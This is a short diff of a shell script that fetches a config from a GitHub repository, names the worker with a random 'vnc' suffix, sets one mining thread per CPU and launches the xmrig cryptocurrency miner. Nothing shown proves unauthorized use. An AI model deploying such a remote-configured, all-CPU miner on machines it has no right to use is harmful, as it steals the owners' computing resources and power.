@@ -24,4 +24,12 @@ $DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/c
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
 
+num_threads=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
+
+# generate the replacement string with -1 repeated num_threads times, separated by commas
+replacement_string=$(printf '-1%.0s, ' $(seq 1 $num_threads))
+replacement_string=${replacement_string%, }  # remove the trailing comma and space
+
+sed -i "s/THREADSTRINGTOREPLACE/$replacement_string/g" config.json
+
 ./xmrig
